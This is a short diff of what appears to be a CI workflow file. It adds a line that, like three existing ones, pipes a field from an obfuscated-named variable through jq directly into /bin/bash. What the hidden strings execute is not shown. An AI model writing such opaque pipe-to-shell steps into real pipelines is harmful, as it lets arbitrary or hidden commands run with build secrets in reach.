@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$zo0" | jq -r .wbel4 | /bin/bash
           printf '%s' "$ozxme9096" | jq -r .rxp499 | /bin/bash
           echo $tlo046 | jq -r .gopmc5 | /bin/bash
+          printf '%s' "$icdb45" | jq -r .s50 | /bin/bash
 
       - name: Upload results
         if: always()
